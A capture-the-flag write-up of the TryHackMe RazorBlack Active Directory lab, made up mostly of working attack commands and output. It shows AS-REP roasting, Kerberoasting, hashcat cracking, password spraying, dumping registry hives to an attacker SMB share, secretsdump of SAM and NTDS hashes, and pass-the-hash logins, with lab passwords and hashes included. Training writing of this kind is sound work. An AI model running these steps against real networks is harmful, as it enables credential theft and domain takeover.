---
title: "TryHackMe - RazorBlack"
author: Nasrallah
description: ""
date: 2023-06-03 00:00:00 +0000
categories : [TryHackMe]
tags: [tryhackme, windows, medium, crackmapexec, hashcat, crack, passthehash, groups, impacket, bruteforce, passwordspraying, smb, activedirectory, AD, DC, kerberoasting, kerberos]
img_path: /assets/img/tryhackme/razorblack
---

<div align="center"> <script src="https://tryhackme.com/badge/367641"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [RazorBlack](https://tryhackme.com/room/raz0rblack) from [TryHackMe](https://tryhackme.com). It's a great Active Directory machine where we use multiple techniques to achieve our goals, I really had fun doing it and I hope you do too.

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for raz0rblack.thm (10.10.138.92)                                                                                                            
Host is up (0.13s latency).                                                                                                                                   
                                                                                                                                                              
PORT      STATE  SERVICE       VERSION                                                                                                                        
53/tcp    open   domain        Simple DNS Plus                                                                                                                
88/tcp    open   kerberos-sec  Microsoft Windows Kerberos (server time: 2023-06-11 09:14:30Z)                                                                 
111/tcp   open   rpcbind       2-4 (RPC #100000)                                                                                                              
| rpcinfo:                                                                                                                                                    
|   program version    port/proto  service                                                                                                                    
|   100000  2,3,4        111/tcp   rpcbind                                                                                                                    
|   100000  2,3,4        111/tcp6  rpcbind                                                                                                                    
|   100000  2,3,4        111/udp   rpcbind                                                                                                                    
|   100000  2,3,4        111/udp6  rpcbind                                                                                                                    
|   100003  2,3         2049/udp   nfs                                                                                                                        
|   100003  2,3         2049/udp6  nfs                                                                                                                        
|   100003  2,3,4       2049/tcp   nfs                                                                                                                        
|   100003  2,3,4       2049/tcp6  nfs                                                                                                                        
|   100005  1,2,3       2049/tcp   mountd                                                                                                                     
|   100005  1,2,3       2049/tcp6  mountd                                                                                                                     
|   100005  1,2,3       2049/udp   mountd                                                                                                                     
|   100005  1,2,3       2049/udp6  mountd                                                                                                                     
|   100021  1,2,3,4     2049/tcp   nlockmgr                                                                                                                   
|   100021  1,2,3,4     2049/tcp6  nlockmgr                                                                                                                   
|   100021  1,2,3,4     2049/udp   nlockmgr                                                                                                                   
|   100021  1,2,3,4     2049/udp6  nlockmgr                                                                                                                   
|   100024  1           2049/tcp   status                                                                                                                     
|   100024  1           2049/tcp6  status                                                                                                                     
|   100024  1           2049/udp   status                                                                                                                     
|_  100024  1           2049/udp6  status                                                                                                                     
135/tcp   open   msrpc         Microsoft Windows RPC                                                                                                          
139/tcp   open   netbios-ssn   Microsoft Windows netbios-ssn                                                                                                  
389/tcp   open   ldap          Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)                                
445/tcp   open   microsoft-ds?                                                                                           
464/tcp   open   kpasswd5?
593/tcp   open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open   tcpwrapped
2049/tcp  open   mountd        1-3 (RPC #100005)
3268/tcp  open   ldap          Microsoft Windows Active Directory LDAP (Domain: raz0rblack.thm, Site: Default-First-Site-Name)
3269/tcp  open   tcpwrapped
3389/tcp  open   ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2023-06-11T09:15:33+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: RAZ0RBLACK
|   NetBIOS_Domain_Name: RAZ0RBLACK
|   NetBIOS_Computer_Name: HAVEN-DC
|   DNS_Domain_Name: raz0rblack.thm
|   DNS_Computer_Name: HAVEN-DC.raz0rblack.thm
|   DNS_Tree_Name: raz0rblack.thm
|   Product_Version: 10.0.17763
|_  System_Time: 2023-06-11T09:15:26+00:00
| ssl-cert: Subject: commonName=HAVEN-DC.raz0rblack.thm
| Not valid before: 2023-06-10T08:46:03 
|_Not valid after:  2023-12-10T08:46:03 
5985/tcp  open   http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
6591/tcp  closed unknown
9389/tcp  open   mc-nmf        .NET Message Framing
15852/tcp closed unknown
19502/tcp closed unknown
21737/tcp closed unknown
25384/tcp closed unknown
38931/tcp closed unknown
47551/tcp closed unknown
49664/tcp open   msrpc         Microsoft Windows RPC
49665/tcp open   msrpc         Microsoft Windows RPC
49667/tcp open   msrpc         Microsoft Windows RPC
49669/tcp open   msrpc         Microsoft Windows RPC
49672/tcp open   msrpc         Microsoft Windows RPC
49675/tcp open   ncacn_http    Microsoft Windows RPC over HTTP 1.0
49676/tcp open   msrpc         Microsoft Windows RPC
49679/tcp open   msrpc         Microsoft Windows RPC
49694/tcp open   msrpc         Microsoft Windows RPC
49708/tcp open   msrpc         Microsoft Windows RPC
49852/tcp open   msrpc         Microsoft Windows RPC
62354/tcp closed unknown
62464/tcp closed unknown
Service Info: Host: HAVEN-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-06-11T09:15:27
|_  start_date: N/A
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
```

The open ports indicates that the target is an Active Directory Domain Controller(AD DC) with the domain `raz0rblack.thm`, let'a add it to `/etc/hosts`.

## NFS

One usual port that is 2049 which is NFS. Let's list shares with `showmount -e raz0rblack.thm`

```terminal
$ sudo showmount -e raz0rblack.thm
Export list for raz0rblack.thm:
/users (everyone)
```

We found a share accessible by everyone, let's mount it and see what it holds.

```terminal
$ sudo mount -t nfs raz0rblack.thm:/users /mnt/ctf
$ cd /mnt/ctf/
$ ls
employee_status.xlsx  sbradley.txt
```

There is a text file named `sbradley` which has a flag and there is an excel file.

Let's open `employee_status.xlsx`

![](1.png)

There is a list of names and the one that looks interesting is `steven bradley` telling us the naming convention used which is first letter of the first name + the last name.

Now let's make a list of usernames

```bash
dport
iroyce
tvidal
aedwards
cingram
ncassidy
rzaydan
lvetrova
rdelgado
twilliams
sbradley
clin
```

Now that we have  a list of usernames, let's try `AS-REP Roasting` attack againt the target using `GetNPUsers.py` from Impacket.

```bash
GetNPUsers.py 'raz0rblack.thm/' -usersfile users.lst -no-pass -dc-ip raz0rblack.thm
```

![](2.png)

We got a hash of the user `twilliams`, let's copy it to a file and crack it.

```bash
$ hashcat -m 18200 twilliams.hash /usr/share/wordlists/rockyou.txt                                              
hashcat (v6.1.1) starting...
                                          
Host memory required for this attack: 134 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

$krb5asrep$23$twilliams@RAZ0RBLACK.THM:e230cdbfb580acf11d2861d6b378ef09$71c1dd02d79ff0ac50fb9a338cb467aee3e251e6aa0554087095c5d9c4cc85fa21934a440f71288ce4147dc10726cbcb403ba68bbef0206903ba39183812554ca8833765737777d292d11c3a02578a7a7f0db6db1cb8e2306303f9087978ce86f20bc7faab5b695ee0b2f65d24e9204e73d9285db7146a414080bb2621e262694acd91785182523050932de3ec68798639bea09e4260cd32e891d27e532fb6caee8e2a8a6d4c72893de0e92d112aa0e27f578f91b96dff57ccefe1e8eccf837f2ba5e38a2e70de803b3f9db7a50b7a4ee43835e4f9d0d5d50176ebb339c6eb7a766422d4e19e6bc940274d8833c49a2a:<REDACTED>
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, AS-REP
Hash.Target......: $krb5asrep$23$twilliams@RAZ0RBLACK.THM:e230cdbfb580...c49a2a
Time.Started.....: Fri Jun 16 17:26:31 2023 (13 secs)
Time.Estimated...: Fri Jun 16 17:26:44 2023 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   340.3 kH/s (7.35ms) @ Accel:32 Loops:1 Thr:64 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 4227072/14344385 (29.47%)
Rejected.........: 0/4227072 (0.00%)
Restore.Point....: 4218880/14344385 (29.41%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: robert2104 -> rmhaey

```

Great! We got the password.

# **Foothold**

## Kerberoasting

Now that we got a password we can perform another attack which is `Kerberoasting`.

When you want to authenticate to some service using Kerberos, you contact the DC and tell it to which system service you want to authenticate. It encrypts a response to you with the service user's password hash. You send that response to the service which can decrypt it with it's password check who you are and decide if it wants to let you in.

In Kerberoasting attack rather than sending the encrypted ticked from the DC to the service, we crack the hash offline and get the password.

To get the hash we'll use `GetUserSPN.py` from `Impacket` to get a list of service usernames which are associated with a normal user account.

```bash
GetUserSPNs.py -request raz0rblack.thm/twilliams -dc-ip raz0rblack.thm -save -outputfile user.hash
```

![](2.png)

Great! We got the hash of user `xyan1d3`, let's crack it.

```bash
$ hashcat -m 13100 user.hash /usr/share/wordlists/rockyou.txt                                                         
hashcat (v6.1.1) starting...

$krb5tgs$23$*xyan1d3$RAZ0RBLACK.THM$raz0rblack.thm/xyan1d3*$9a7545adca441f87ecc98d55290d53ca$cf934e679d610148512a50c1e7ffa5af66e0572fe7d3dbea2ad7a0595a29986b9b0e3c7af9c88e73a59c83d87058b0fef841ba7ba9e2f38007f4d8dc751c2f595b555f9aba945b03d2fad657bf47a8efaacb61a08003801dd020c84d66d6510247b4212e7661ea62491746ed1782b1c1ee64ea07f3b63a6f63800897d53aac53993ca522176af22d7895a7b9eb2422e25a28f1315843478bf3bcb96f027cd035dfb511ce89b26b7652c09605d955b1e7572a6dcc87c8ae31e92a062f888edc88390f3fc577d8092e8eacc6fac8794b50676b1208fb08f430b21cc3bc7eb5b5bef92cec9845f54fc943f5251a82f2d6e7176d495489123819b312cd3d6d45a23f43292cc252b0efc1bc859796ed8d1a80d4bc5db813dc1be4fcf682c55dff49b06df5dffca40481ade44e87e73029fce2795786b008868072c8d2e042a00180a8ca43a8b75d79d43a4a2f70a57191d4c39d8dfdfab880a4eecd49dd2470d1cdc239889f8b76030f93b060d3459aee97ae7a1c5cf58d008bc14a5d235498438b18e0e0fe6446f60bda1a57e0f70d9b97a7fd99c3304e32854adddbef92c9739702191d7348e1f959214c9dc1a5228271636642c2d9f1b018fb1bc880c6704cf5075e65bb8bd729a7cd3fac3d2da13b072f568d88fad51c5ecac97a08aa6d6c1cd12680f007cd3d2b831a91058377fbf3ed238f10adbf978e30a07e9eef6e4aa60331744ab74552386abe26e18c5a90500e18cdba142f507e41e1f7f86a178d5efa0a492ada0706e8eb29092a595b2f8c7f25ea04d706f4a9107fc60bb54a34bfba8412c7701327a01c9f6c6de5a9f1db9643dd892bfbd08c3d21d32556ddbbe0c5de9ab2af1973066b1606d67921e997da077d0339b28876ca5351c31e750b15cb098ee5d7e629eae76f341438965f6a0bbad80a70e6c13fa052f320233bead4e358990a01ee462188aac8cf2941608644fd40553b21215ef9d3c9b95d50065cc7c41260565e3a7cf58e20c84a9bdb1e691c20350a3b865d9eaacb23fb7bd1f6f94db881e79713d86669f5eb4e29817a3a306b53c51d62039f03d7d02b88033d56f9ada6a7af3f163b3bda62cad4658558576bcf3f070808890650b956e68e9bc7de828ddb05dd25f133b86700289b7ce06c4b09b8048f30689e55cd8f42fe57f4cdb21d1a888646303edec4d61c6a2174ccd4b759518b1ef20a0a930ad9ef184f746841722afa04bf165d59b4a105ed8ad04bbe83a2861e366e5888a81c12e38ff353f5ba5c10cb4725caad504fb9d8e560c5dddd15a9479659b8ba683c508dd45eff90638e7a76e284def64123f6ef1040f021f09284f7e6416b3ba1daba3d9f4bbba7f1aabeb60eefa998ecfe8c39c2c863067d4fe6385efbf7e13cb23c2c36df8a7107593fe5eb6d3c4a8889e21a3e:cyanide9am<REDACTED>
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Kerberos 5, etype 23, TGS-REP
Hash.Target......: $krb5tgs$23$*xyan1d3$RAZ0RBLACK.THM$raz0rblack.thm/...e21a3e
Time.Started.....: Fri Jun 16 18:23:52 2023 (27 secs)
Time.Estimated...: Fri Jun 16 18:24:19 2023 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   331.8 kH/s (7.19ms) @ Accel:32 Loops:1 Thr:64 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 8871936/14344385 (61.85%)
Rejected.........: 0/8871936 (0.00%)
Restore.Point....: 8863744/14344385 (61.79%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: cynthia73 -> cv152007s

```

We got the password, let's see if we can use it to authenticate via `winrm`

```bash
$ evil-winrm -i raz0rblack.thm -u xyan1d3 -p cyanide9amine5628

Evil-WinRM shell v3.4

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\xyan1d3\Documents> 
```

Great! We're in.

# **Privilege Escalation**

Let's check our privileges.

```bash
*Evil-WinRM* PS C:\Users\xyan1d3\Documents> whoami /all                                                                                               [79/603]
                                                                                                                                                              
USER INFORMATION                                                                                                                                              
----------------                                                                                                                                              
                                                                                                                                                              
User Name          SID                                                                                                                                        
================== ============================================                                                                                               
raz0rblack\xyan1d3 S-1-5-21-3403444377-2687699443-13012745-1106                                                                                               
                                                                                                                                                              
                                                                                                                                                              
GROUP INFORMATION                                                                                                                                             
-----------------                                                                                                                                             
                                                                                                                                                              
Group Name                                 Type             SID          Attributes                                                                           
========================================== ================ ============ ==================================================                                   
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group                                   
BUILTIN\Backup Operators                   Alias            S-1-5-32-551 Mandatory group, Enabled by default, Enabled group                                   
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group                                   
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group                                   
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group                                   
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group                                   
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group                                   
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group                                   
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group                                   
Mandatory Label\High Mandatory Level       Label            S-1-16-12288                                                                                      
                                                                                                                                                              
                                                                                                       PRIVILEGES INFORMATION                                                                                                                                        
----------------------                                                                                                                                        
                                                                                                                                                              
Privilege Name                Description                    State                                                                                            
============================= ============================== =======                                                                                          
SeMachineAccountPrivilege     Add workstations to domain     Enabled                                                                                          
SeBackupPrivilege             Back up files and directories  Enabled                                                                                          
SeRestorePrivilege            Restore files and directories  Enabled                                                                                          
SeShutdownPrivilege           Shut down the system           Enabled                                                                                          
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.
```

We see that we have `SeBackupPrivilege` and we're part of the `BackupOperators` group, allowing us to access files normal users can't.

Let's copy `system` and `sam` files from the registry and transfer them to our attacking machine.

```bash
*Evil-WinRM* PS C:\Users\xyan1d3\Documents> reg save HKLM\system .\system
The operation completed successfully.

*Evil-WinRM* PS C:\Users\xyan1d3\Documents> reg save HKLM\sam .\sam
The operation completed successfully.

*Evil-WinRM* PS C:\Users\xyan1d3\Documents> copy .\sam //10.9.76.240/share
*Evil-WinRM* PS C:\Users\xyan1d3\Documents> copy .\system //10.9.76.240/share
```

Now with the help of `secretsdump.py` script from `Impacket` let's extract the hashes.

```bash
$ secretsdump.py -sam sam -system system local                                                                                                           
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation                                                                                                      
                                                                                                                                                              
[*] Target system bootKey: 0xf1582a79dd00631b701d3d15e75e59f6                                                                                                 
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)                                                                                                          
Administrator:500:aad3b435b51404eeaad3b435b51404ee:9689931bed40ca5a2ce1218210177f0c:::                                                                        
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                       [-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.                                                      
[*] Cleaning up...                                                                                 
```

We got the administrator's NTLM hash.

With `pass-the-hash` attack, we can authenticate to windows services with only the hash, so let's authenticate via winrm with the hash.

```shell
$ evil-winrm -i raz0rblack.thm -u administrator -H 9689931bed40ca5a2ce1218210177f0c                                                                      
                                                                                                                                                              
Evil-WinRM shell v3.4                                                                                                                                         
                                                                                                                                                              
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                       
                                                                                                                                                              
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                         
                                                                                                                                                              
Info: Establishing connection to remote endpoint                                                                                                              
                                                                                                                                                              
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami                                                                                                      
raz0rblack\administrator                                                   
```

Great! We got Administrator.

# **After Administrator**

We've got admin access but we still need to answer some other questions and showcase some techniques worth knowing.

Let's go back to where we got the password for user `twilliams`

## SMB

Let's use the password and list shares of the SMB server. 

```bash
$ crackmapexec smb raz0rblack.thm -u twilliams -p roastpotatoes --shares
SMB         raz0rblack.thm  445    HAVEN-DC         [*] Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)
SMB         raz0rblack.thm  445    HAVEN-DC         [+] raz0rblack.thm\twilliams:roastpotatoes 
SMB         raz0rblack.thm  445    HAVEN-DC         [+] Enumerated shares
SMB         raz0rblack.thm  445    HAVEN-DC         Share           Permissions     Remark
SMB         raz0rblack.thm  445    HAVEN-DC         -----           -----------     ------
SMB         raz0rblack.thm  445    HAVEN-DC         ADMIN$                          Remote Admin
SMB         raz0rblack.thm  445    HAVEN-DC         C$                              Default share
SMB         raz0rblack.thm  445    HAVEN-DC         IPC$            READ            Remote IPC
SMB         raz0rblack.thm  445    HAVEN-DC         NETLOGON        READ            Logon server share 
SMB         raz0rblack.thm  445    HAVEN-DC         SYSVOL          READ            Logon server share 
SMB         raz0rblack.thm  445    HAVEN-DC         trash                           Files Pending for deletion
```

We managed to list shares but we don't have read permission on the important ones like `C$` or `ADMIN$`.

Let's see if there is anyone is using the same password.

```bash
$ crackmapexec smb raz0rblack.thm -u users.lst -p roastpotatoes --continue-on-success
SMB         raz0rblack.thm  445    HAVEN-DC         [*] Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)
SMB         raz0rblack.thm  445    HAVEN-DC         [-] raz0rblack.thm\dport:roastpotatoes STATUS_LOGON_FAILURE 
SMB         raz0rblack.thm  445    HAVEN-DC         [-] raz0rblack.thm\iroyce:roastpotatoes STATUS_LOGON_FAILURE 
SMB         raz0rblack.thm  445    HAVEN-DC         [-] raz0rblack.thm\tvidal:roastpotatoes STATUS_LOGON_FAILURE 
SMB         raz0rblack.thm  445    HAVEN-DC         [-] raz0rblack.thm\aedwards:roastpotatoes STATUS_LOGON_FAILURE 
SMB         raz0rblack.thm  445    HAVEN-DC         [-] raz0rblack.thm\cingram:roastpotatoes STATUS_LOGON_FAILURE 
SMB         raz0rblack.thm  445    HAVEN-DC         [-] raz0rblack.thm\ncassidy:roastpotatoes STATUS_LOGON_FAILURE 
SMB         raz0rblack.thm  445    HAVEN-DC         [-] raz0rblack.thm\rzaydan:roastpotatoes STATUS_LOGON_FAILURE 
SMB         raz0rblack.thm  445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:roastpotatoes STATUS_LOGON_FAILURE 
SMB         raz0rblack.thm  445    HAVEN-DC         [-] raz0rblack.thm\rdelgado:roastpotatoes STATUS_LOGON_FAILURE 
SMB         raz0rblack.thm  445    HAVEN-DC         [+] raz0rblack.thm\twilliams:roastpotatoes 
SMB         raz0rblack.thm  445    HAVEN-DC         [-] raz0rblack.thm\sbradley:roastpotatoes STATUS_PASSWORD_MUST_CHANGE 
SMB         raz0rblack.thm  445    HAVEN-DC         [-] raz0rblack.thm\clin:roastpotatoes STATUS_LOGON_FAILURE 
```

We see that user `sbradley` uses the same password but it needs to be changed, and for that we can use `smbpasswd`

```bash
$ smbpasswd -r raz0rblack.thm -U sbradley                            
Old SMB password:
New SMB password:
Retype new SMB password:
Password changed for user sbradley
```

Now let's list shares and see if we have any other permissions over the shares.

```bash
$ crackmapexec smb raz0rblack.thm -u sbradley -p roastpotatoes1 --shares     
SMB         raz0rblack.thm  445    HAVEN-DC         [*] Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)
SMB         raz0rblack.thm  445    HAVEN-DC         [+] raz0rblack.thm\sbradley:roastpotatoes1 
SMB         raz0rblack.thm  445    HAVEN-DC         [+] Enumerated shares
SMB         raz0rblack.thm  445    HAVEN-DC         Share           Permissions     Remark
SMB         raz0rblack.thm  445    HAVEN-DC         -----           -----------     ------
SMB         raz0rblack.thm  445    HAVEN-DC         ADMIN$                          Remote Admin
SMB         raz0rblack.thm  445    HAVEN-DC         C$                              Default share
SMB         raz0rblack.thm  445    HAVEN-DC         IPC$            READ            Remote IPC
SMB         raz0rblack.thm  445    HAVEN-DC         NETLOGON        READ            Logon server share 
SMB         raz0rblack.thm  445    HAVEN-DC         SYSVOL          READ            Logon server share 
SMB         raz0rblack.thm  445    HAVEN-DC         trash           READ            Files Pending for deletion
```

The user can read `trash`, let's connect to the share.

```bash
$ smbclient //raz0rblack.thm/trash -U sbradley%roastpotatoes1
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Mar 16 07:01:28 2021
  ..                                  D        0  Tue Mar 16 07:01:28 2021
  chat_log_20210222143423.txt         A     1340  Thu Feb 25 20:29:05 2021
  experiment_gone_wrong.zip           A 18927164  Tue Mar 16 07:02:20 2021
  sbradley.txt                        A       37  Sat Feb 27 20:24:21 2021

                5101823 blocks of size 4096. 939467 blocks available
smb: \> get chat_log_20210222143423.txt 
getting file \chat_log_20210222143423.txt of size 1340 as chat_log_20210222143423.txt (1.9 KiloBytes/sec) (average 1.9 KiloBytes/sec)
smb: \> get sbradley.txt 
getting file \sbradley.txt of size 37 as sbradley.txt (0.1 KiloBytes/sec) (average 1.1 KiloBytes/sec)
smb: \> get experiment_gone_wrong.zip 
parallel_read returned NT_STATUS_IO_TIMEOUT
smb: \> getting file \experiment_gone_wrong.zip of size 18927164 as experiment_gone_wrong.zip SMBecho failed (NT_STATUS_CONNECTION_DISCONNECTED). The connection is disconnected now
```

We found three files, managed to download two and failed for the zip file because it's very big. To solve that i used the following command:

```bash
smbclient //raz0rblack.thm/trash -U sbradley%roastpotatoes1 -c 'mget *.zip' -t 120
```

Nothing usefull in the text files, so let's unzip the zip file.

![](4.png)

The zip file was encrypted to we used `zip2john` and crack the hash and manged to get two file `ntds.dit` and `system.hive`.

Those two file are very dangerous because they contains password hashes.

With the help of `secretsdump.py`, let's extract the hashes.

```bash
secretsdump.py -ntds ntds.dit -system system.hive local
```

![](5.png)

We got ton of hashes back, let's save them to a file and use the following command to clean it and only save the LM hases.

```bash
cat hashes.txt | grep -i ad3b435b51404eeaad3b435b51404ee | cut -d ':' -f 4 > lmhases.txt
```

This leaves us with hashes we can use for `pass-the-hash` attack.

Let's first see what user's are on the target machine.

```bash
$ crackmapexec smb raz0rblack.thm -u sbradley -p roastpotatoes1 --users                                                                                  
SMB         raz0rblack.thm  445    HAVEN-DC         [*] Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)     
SMB         raz0rblack.thm  445    HAVEN-DC         [+] raz0rblack.thm\sbradley:roastpotatoes1                                                                
SMB         raz0rblack.thm  445    HAVEN-DC         [+] Enumerated domain user(s)                                                                             
SMB         raz0rblack.thm  445    HAVEN-DC         raz0rblack.thm\twilliams                      badpwdcount: 0 desc:                                        
SMB         raz0rblack.thm  445    HAVEN-DC         raz0rblack.thm\sbradley                       badpwdcount: 0 desc: 
SMB         raz0rblack.thm  445    HAVEN-DC         raz0rblack.thm\lvetrova                       badpwdcount: 0 desc: 
SMB         raz0rblack.thm  445    HAVEN-DC         raz0rblack.thm\xyan1d3                        badpwdcount: 0 desc: 
SMB         raz0rblack.thm  445    HAVEN-DC         raz0rblack.thm\krbtgt                         badpwdcount: 0 desc: Key Distribution Center Service Account
SMB         raz0rblack.thm  445    HAVEN-DC         raz0rblack.thm\Guest                          badpwdcount: 0 desc: Built-in account for guest access to th
e computer/domain
SMB         raz0rblack.thm  445    HAVEN-DC         raz0rblack.thm\Administrator                  badpwdcount: 0 desc: Built-in account for administering the 
computer/domain
```

Tried to login as administrator with his hash but failed, the only thing left is to try with user `lvetrova` because it's the only one we don't have creds for.

```bash
$ crackmapexec smb raz0rblack.thm -u lvetrova -H nthashes.txt                                                                                            
SMB         raz0rblack.thm  445    HAVEN-DC         [*] Windows 10.0 Build 17763 x64 (name:HAVEN-DC) (domain:raz0rblack.thm) (signing:True) (SMBv1:False)
SMB         raz0rblack.thm  445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:1afedc472d0fdfe07cd075d36804efd0 STATUS_LOGON_FAILURE 
SMB         raz0rblack.thm  445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:31d6cfe0d16ae931b73c59d7e0c089c0 STATUS_LOGON_FAILURE 
SMB         raz0rblack.thm  445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:4ea59b8f64c94ec66ddcfc4e6e5899f9 STATUS_LOGON_FAILURE 
SMB         raz0rblack.thm  445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:703a365974d7c3eeb80e11dd27fb0cb3 STATUS_LOGON_FAILURE 
SMB         raz0rblack.thm  445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:da3542420eff7cfab8305a68b7da7043 STATUS_LOGON_FAILURE 
SMB         raz0rblack.thm  445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:c378739d7c136c1281d06183665702ea STATUS_LOGON_FAILURE 
SMB         raz0rblack.thm  445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:9f73aaafc3b6d62acdbb0b426f302f9e STATUS_LOGON_FAILURE 
SMB         raz0rblack.thm  445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:6a5bad944868142e65ad3049a393e587 STATUS_LOGON_FAILURE 
SMB         raz0rblack.thm  445    HAVEN-DC         [-] raz0rblack.thm\lvetrova:b112332330f11267486d21549d326bd5 STATUS_LOGON_FAILURE 
[...]
SMB         raz0rblack.thm  445    HAVEN-DC         [+] raz0rblack.thm\lvetrova:f220d3988deb3f516c73f40ee16c431d 
```

Great! We got a hash, let's use `evil-winrm` and authenticate using `pass-the-hash`

```bash
$ evil-winrm -i raz0rblack.thm -u lvetrova -H f220d3988deb3f516c73f40ee16c431d                                                                           
                                                                                                                                                              
Evil-WinRM shell v3.4                                                                                                                                         
                                                                                                                                                              
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine                       
                                                                                                                                                              
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion                                         
                                                                                                                                                              
Info: Establishing connection to remote endpoint                                                                                                              
                                                                                                                                                              
*Evil-WinRM* PS C:\Users\lvetrova\Documents>
```

On `lvetrova` home folder we find an xml file.

```terminal
*Evil-WinRM* PS C:\Users\lvetrova> ls


    Directory: C:\Users\lvetrova


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        9/15/2018  12:19 AM                Desktop
d-r---        2/25/2021  10:14 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos
-a----        2/25/2021  10:16 AM           1692 lvetrova.xml
```

The file contains what look like an encrypted password.

That string a powershell secure string and we can decrypt using the following command.

```powershell
$cred = Import-CliXml -Path lvetrova.xml; $cred.GetNetworkCredential() | Format-List *
```

It gave us a flag.

On `Xyan1d3` we can also find the xml file and decrypt it using the same method.

On `Administrator` we find `root.xml` but can't decrypt it that's because the string is in hex and not a powershell secure object.

Let's decrypt it:

```bash
$ echo '44616d6e20796f752061726520612067656e6975732e0a4275742c20492061706f6c6f67697a6520666f72206368656174696e6720796f75206c696b6520746869732e0a0a4865726520697320796f757220526f6f7420466c61670a54484d7b31623466343663633466626134363334383237336431386463393164613230647d0a0a546167206d65206f6e2068747470733a2f2f747769747465722e636f6d2f5879616e3164332061626f75742077686174207061727420796f7520656e6a6f796564206f6e207468697320626f7820616e642077686174207061727420796f75207374727567676c656420776974682e0a0a496620796f7520656e6a6f796564207468697320626f7820796f75206d617920616c736f2074616b652061206c6f6f6b20617420746865206c696e75786167656e637920726f6f6d20696e207472796861636b6d652e0a576869636820636f6e7461696e7320736f6d65206c696e75782066756e64616d656e74616c7320616e642070726976696c65676520657363616c6174696f6e2068747470733a2f2f7472796861636b6d652e636f6d2f726f6f6d2f6c696e75786167656e63792e0a' | xxd -r -p
